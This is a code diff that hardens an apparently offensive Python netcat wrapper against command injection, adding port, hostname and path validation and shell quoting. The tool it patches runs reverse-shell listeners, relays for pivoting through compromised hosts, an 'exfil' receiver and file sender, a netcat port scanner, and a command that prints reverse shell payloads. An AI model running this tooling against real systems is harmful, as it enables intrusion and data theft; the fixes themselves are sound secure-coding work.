@@ -18,6 +18,8 @@ import threading
 import socket
 import os
 import tempfile
+import shlex
+import re
 from typing import Callable, Optional
 from dataclasses import dataclass
 from datetime import datetime
@@ -53,6 +55,31 @@ class NetcatProxy:
         # Ensure log directory exists
         os.makedirs(log_dir, exist_ok=True)
     
+    @staticmethod
+    def _validate_port(port: int) -> int:
+        """Validate port number is in valid range"""
+        if not isinstance(port, int) or port < 1 or port > 65535:
+            raise ValueError(f"Invalid port number: {port}")
+        return port
+    
+    @staticmethod
+    def _validate_hostname(hostname: str) -> str:
+        """Validate hostname/IP address format"""
+        # Allow alphanumeric, dots, dashes, and underscores for hostnames
+        if not re.match(r'^[a-zA-Z0-9._-]+$', hostname):
+            raise ValueError(f"Invalid hostname format: {hostname}")
+        return hostname
+    
+    @staticmethod
+    def _validate_filepath(filepath: str) -> str:
+        """Validate filepath doesn't contain dangerous characters"""
+        # Resolve to absolute path and check it doesn't escape
+        abs_path = os.path.abspath(filepath)
+        # Basic check - path should not try to escape using ..
+        if '..' in filepath or not os.path.exists(os.path.dirname(abs_path)):
+            raise ValueError(f"Invalid or unsafe file path: {filepath}")
+        return abs_path
+    
     def start_listener(
         self, 
         port: int, 
@@ -70,12 +97,14 @@ class NetcatProxy:
         Returns:
             Listener object with process handle
         """
+        port = self._validate_port(port)
+        
         if port in self.listeners:
             raise ValueError(f"Port {port} already has an active listener")
         
         log_file = os.path.join(self.log_dir, f"listener_{port}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log")
         
-        # Start netcat listener
+        # Start netcat listener with validated port
         proc = subprocess.Popen(
             ['nc', '-lvnp', str(port)],
             stdout=subprocess.PIPE,
@@ -138,7 +167,12 @@ class NetcatProxy:
         
         Useful for pivoting through compromised hosts
         """
-        # Create named pipe for bidirectional relay
+        # Validate inputs
+        local_port = self._validate_port(local_port)
+        target_port = self._validate_port(target_port)
+        target_host = self._validate_hostname(target_host)
+        
+        # Create named pipe for bidirectional relay with validated port
         pipe_path = f"/tmp/relay_{local_port}"
         
         # Clean up existing pipe
@@ -148,6 +182,7 @@ class NetcatProxy:
         # Create relay using socat (more reliable than nc for relays)
         # Fall back to nc-based relay if socat not available
         try:
+            # Use validated parameters directly (not in shell)
             proc = subprocess.Popen(
                 ['socat', f'TCP-LISTEN:{local_port},fork', f'TCP:{target_host}:{target_port}'],
                 stdout=subprocess.PIPE,
@@ -156,11 +191,8 @@ class NetcatProxy:
             self.relays[local_port] = proc
             print(f"[+] Relay created: localhost:{local_port} → {target_host}:{target_port} (socat)")
         except FileNotFoundError:
-            # Fallback to nc-based relay
-            cmd = f'''
-            mkfifo {pipe_path} 2>/dev/null
-            nc -lvnp {local_port} < {pipe_path} | nc {target_host} {target_port} > {pipe_path}
-            '''
+            # Fallback to nc-based relay with proper argument handling
+            cmd = f'mkfifo {shlex.quote(pipe_path)} 2>/dev/null; nc -lvnp {local_port} < {shlex.quote(pipe_path)} | nc {shlex.quote(target_host)} {target_port} > {shlex.quote(pipe_path)}'
             proc = subprocess.Popen(['bash', '-c', cmd], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
             self.relays[local_port] = proc
             print(f"[+] Relay created: localhost:{local_port} → {target_host}:{target_port} (nc)")
@@ -189,12 +221,17 @@ class NetcatProxy:
         
         Data sent to this port will be saved to output_file
         """
+        port = self._validate_port(port)
+        output_file = self._validate_filepath(output_file)
+        
         # Use nc to receive and save directly
         with open(output_file, 'wb') as f:
             pass  # Create empty file
         
+        # Use properly quoted filename to prevent command injection
+        cmd = f'nc -lvnp {port} >> {shlex.quote(output_file)}'
         proc = subprocess.Popen(
-            ['bash', '-c', f'nc -lvnp {port} >> {output_file}'],
+            ['bash', '-c', cmd],
             stdout=subprocess.PIPE,
             stderr=subprocess.PIPE
         )
@@ -217,13 +254,19 @@ class NetcatProxy:
         """
         Send a file to a remote listener
         """
+        target_host = self._validate_hostname(target_host)
+        target_port = self._validate_port(target_port)
+        file_path = self._validate_filepath(file_path)
+        
         if not os.path.exists(file_path):
             print(f"[ERROR] File not found: {file_path}")
             return False
         
         try:
+            # Use properly quoted arguments to prevent command injection
+            cmd = f'nc {shlex.quote(target_host)} {target_port} < {shlex.quote(file_path)}'
             result = subprocess.run(
-                ['bash', '-c', f'nc {target_host} {target_port} < {file_path}'],
+                ['bash', '-c', cmd],
                 timeout=60,
                 capture_output=True
             )
@@ -238,8 +281,20 @@ class NetcatProxy:
         Quick port scan using netcat
         (Poor man's nmap - use for quick checks only)
         """
+        target = self._validate_hostname(target)
+        
+        # Validate port_range format
+        if '-' not in port_range:
+            raise ValueError("Port range must be in format 'start-end'")
+        
+        try:
+            start, end = map(int, port_range.split('-'))
+            start = self._validate_port(start)
+            end = self._validate_port(end)
+        except (ValueError, TypeError) as e:
+            raise ValueError(f"Invalid port range format: {port_range}") from e
+        
         open_ports = []
-        start, end = map(int, port_range.split('-'))
         
         print(f"[*] Scanning {target} ports {start}-{end}...")
         
@@ -348,59 +403,60 @@ def interactive_proxy():
         parts = cmd.split()
         action = parts[0].lower()
         
-        if action in ['exit', 'quit', 'q']:
-            proxy.cleanup()
-            break
-        
-        elif action == 'listen' and len(parts) >= 2:
-            port = int(parts[1])
-            purpose = ' '.join(parts[2:]) if len(parts) > 2 else "shell catcher"
-            proxy.start_listener(port, callback=print, purpose=purpose)
-        
-        elif action == 'stop' and len(parts) >= 2:
-            port = int(parts[1])
-            proxy.stop_listener(port)
-        
-        elif action == 'relay' and len(parts) >= 4:
-            local_port = int(parts[1])
-            target_host = parts[2]
-            target_port = int(parts[3])
-            proxy.create_relay(local_port, target_host, target_port)
-        
-        elif action == 'exfil' and len(parts) >= 3:
-            port = int(parts[1])
-            output_file = parts[2]
-            proxy.exfil_receiver(port, output_file)
-        
-        elif action == 'send' and len(parts) >= 4:
-            target_host = parts[1]
-            target_port = int(parts[2])
-            file_path = parts[3]
-            proxy.file_sender(target_host, target_port, file_path)
-        
-        elif action == 'scan' and len(parts) >= 2:
-            target = parts[1]
-            port_range = parts[2] if len(parts) > 2 else "1-1000"
-            proxy.port_scan(target, port_range)
-        
-        elif action == 'shells' and len(parts) >= 3:
-            lhost = parts[1]
-            lport = int(parts[2])
-            shells = ReverseShellGenerator.all(lhost, lport)
-            print("\n🐚 Reverse Shell Payloads:")
-            for name, payload in shells.items():
-                print(f"\n[{name}]")
-                print(payload)
-        
-        elif action == 'list':
-            active = proxy.list_active()
-            print(f"\n📡 Active Listeners: {len(active['listeners'])}")
-            for port, info in active['listeners'].items():
-                print(f"  :{port} - {info['purpose']}")
-            print(f"\n🔀 Active Relays: {active['relays']}")
-        
-        elif action == 'help':
-            print("""
+        try:
+            if action in ['exit', 'quit', 'q']:
+                proxy.cleanup()
+                break
+            
+            elif action == 'listen' and len(parts) >= 2:
+                port = int(parts[1])
+                purpose = ' '.join(parts[2:]) if len(parts) > 2 else "shell catcher"
+                proxy.start_listener(port, callback=print, purpose=purpose)
+            
+            elif action == 'stop' and len(parts) >= 2:
+                port = int(parts[1])
+                proxy.stop_listener(port)
+            
+            elif action == 'relay' and len(parts) >= 4:
+                local_port = int(parts[1])
+                target_host = parts[2]
+                target_port = int(parts[3])
+                proxy.create_relay(local_port, target_host, target_port)
+            
+            elif action == 'exfil' and len(parts) >= 3:
+                port = int(parts[1])
+                output_file = parts[2]
+                proxy.exfil_receiver(port, output_file)
+            
+            elif action == 'send' and len(parts) >= 4:
+                target_host = parts[1]
+                target_port = int(parts[2])
+                file_path = parts[3]
+                proxy.file_sender(target_host, target_port, file_path)
+            
+            elif action == 'scan' and len(parts) >= 2:
+                target = parts[1]
+                port_range = parts[2] if len(parts) > 2 else "1-1000"
+                proxy.port_scan(target, port_range)
+            
+            elif action == 'shells' and len(parts) >= 3:
+                lhost = parts[1]
+                lport = int(parts[2])
+                shells = ReverseShellGenerator.all(lhost, lport)
+                print("\n🐚 Reverse Shell Payloads:")
+                for name, payload in shells.items():
+                    print(f"\n[{name}]")
+                    print(payload)
+            
+            elif action == 'list':
+                active = proxy.list_active()
+                print(f"\n📡 Active Listeners: {len(active['listeners'])}")
+                for port, info in active['listeners'].items():
+                    print(f"  :{port} - {info['purpose']}")
+                print(f"\n🔀 Active Relays: {active['relays']}")
+            
+            elif action == 'help':
+                print("""
 Commands:
   listen <port> [purpose]     - Start listener
   stop <port>                 - Stop listener
@@ -412,10 +468,15 @@ Commands:
   list                        - Show active connections
   help                        - Show this help
   exit                        - Exit
-            """)
+                """)
+            
+            else:
+                print("[?] Unknown command. Type 'help' for options.")
         
-        else:
-            print("[?] Unknown command. Type 'help' for options.")
+        except ValueError as e:
+            print(f"[ERROR] Invalid input: {e}")
+        except Exception as e:
+            print(f"[ERROR] Command failed: {e}")
 
 
 if __name__ == "__main__":
